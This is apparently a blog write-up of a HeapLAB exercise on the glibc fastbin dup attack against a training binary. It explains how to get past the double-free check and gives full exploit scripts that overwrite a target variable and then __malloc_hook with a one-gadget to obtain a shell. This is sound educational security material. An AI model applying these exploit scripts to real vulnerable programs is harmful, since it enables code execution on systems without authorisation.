---
layout: post
title:  "HeapLAB 1 - Fastbin Dup"
date:   2022-12-03 20:00:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## History

The fastbin dup was officially described at 2014, but it has been around for longer. \
It works for glibc versions `<= 2.31`.

## General 

A double-free bug may be useful in order to trigger this technique. 

The idea is that freeing an already free chunk, would link it twice towards its fastbin (or tcachebin) - so it could be allocated for two different requests simulaneously. 

For example, the first chunk of the fastbin would be allocated to store a secret password, while the second chunk from the fastbin would store a user-controlled data. \
Both of the allocations would point towards the same memory, hence producing a user-controlled secret password.

## Exercise

We are given a glibc `2.30` binary that requests `username` (with a sanity check for valid input size), as well as menu options - allowing allocating, writing to, and freeing chunks.

Upon writing, a check is performed - so no heap overflow occurs.

Our goal is to overwrite the `target` variable, located within `struct user` - right after the controlled input of `username`:

```bash
pwndbg> ptype user
type = struct user {
    char username[16];
    char target[16];
}
```

By executing request to free certain chunk twice, we would get the following error:

```bash
double free or corruption (fasttop)

Program received signal SIGABRT, Aborted.
```

This is due to a glibc double-free exploit mitigation. 

The stack frame:

```bash
 ► f 0   0x7ffff7a5204a raise+202
   f 1   0x7ffff7a530f5 abort+357
   f 2   0x7ffff7a93f07 __libc_message+599
   f 3   0x7ffff7a9b2aa
   f 4   0x7ffff7a9ccb4 _int_free+948
   f 5         0x400a22 main+603
   f 6   0x7ffff7a3e037 __libc_start_main+231
   f 7         0x40070a _start+42
```

By issuing `f 4`, we would switch to the `_int_free` function frame. By issuing `context code`, we can see the triggering code:

```c
if (__builtin_expect (old == p, 0))
    malloc_printerr ("double free or corruption (fasttop)");
p->fd = old;
*fb = p;
```

This mitigation is simple - it checks that the top of the bin, `old` is not the chunk we're going to add, `p`. 

## Exploitation

We can easily bypass the mitigation, by freeing another chunk within the same fastbin, before double-freeing our target chunk. \
By doing so, i got the same chunk twice within the same fastbin:

```bash
pwndbg> fastbins
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

The key idea, is that after performing the double free, another allocation of the same bin would be taking one of the doubly-freed chunks - `0x603000`.

Since the program allows us to control the user content of an allocated chunk, it will allow us to *override the fd pointer* - as it is reinterpreted as user content on the newly allocated chunk!

By overriding the `fd` ptr to arbitrary address, we can link it to some fake chunk we may control!

For example:

```c
# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A"*0x28)
chunk_B = malloc(0x28, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x28, p64(elf.sym.user))
```

So the fastbins layout (the `user` struct begins with 16 bytes of username, hence the target located exactly at the user content of the chunk):

```bash
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

By allocating 3 chunks to the 0x30 fastbin, we may override the target address. 

It is important to make sure our fake chunk `size` field corresponds to the fastbin allocation.

That is due to the following mitigation:

```c
if (__glibc_likely (victim != NULL))
  {
    size_t victim_idx = fastbin_index (chunksize (victim));
   if (__builtin_expect (victim_idx != idx, 0))
 ►   malloc_printerr ("malloc(): memory corruption (fast)");
   check_remalloced_chunk (av, victim, nb);
```

`victim` stands for the fastbin candidate we would like to re-allocate for the requested malloc call. 

There is a sanity check, that the chunk's `size` field corresponds with a correct fastbin index, `idx`. \
Therefore, it is important to insert a '1 = 0x31' to the 9th byte of the `username` field. 

Full POC:

```c
# Set the username field.
username = b"Z" * 8 + b"1"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A"*0x28)
chunk_B = malloc(0x28, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x28, p64(elf.sym.user))


chunk_C = malloc(0x28, b"C"*0x28)
chunk_D = malloc(0x28, b"D"*0x28)
exp_chunk = malloc(0x28, b"NODERNEDER,NEDERNODER!")
```

## Code Execution

We can override `__free_hook` with `system` (or a one-gadget). \
The cool thing about free, is that its argument points toward the *user data* of a certain chunk. This allows us easy set of the ptr data to `/bin/sh`. 

However we must make sure we can bypass the `size` fastbins mitigation, so there should be some low-value (`0x20 - 0x80`)quadword somewhere surrounding the hook.

Thankfully, `pwndbg` have the special command - `find_fake_fast`, which can help locate fake chunks that qualify for the fastbins:

```bash
pwndbg> find_fake_fast &__malloc_hook
Searching for fastbin sizes up to 0x80 starting at 0x7ffff7dd0ad8 resulting in an overlap of 0x7ffff7dd0b50
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7dd0b2d
prev_size: 0xfff7dccee0000000
size: 0x7f
fd: 0xfff7a9fa10000000
bk: 0xfff7a9fed000007f
fd_nextsize: 0x7f
bk_nextsize: 0x00
```

`pwndbg` is pretty awesome - it found a matching non-aligned chunk, that meets our needs. 

This chunk resides 35 bytes before our `__malloc_hook` symbol. 

Because the new chunk's size is `0x7f`, we would have to change our malloc requests so they will land at the `0x70` fastbin.

By executing `one_gadget`, we can find candidates to replace the `__malloc_hook` call.

Shell POC:

```c
# Set the username field.
username = b"Z" * 8 + b"1"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x68, p64(libc.sym.__malloc_hook - 35))


chunk_C = malloc(0x68, b"C"*0x68)
chunk_D = malloc(0x68, b"D"*0x68)

# Overwrite __malloc_hook with one gadget
exp_chunk = malloc(0x68, b"E"*19 + p64(libc.address + 0xe1fa1))

# Trigger the one gadget
malloc(1, b"")
```

## Challenge


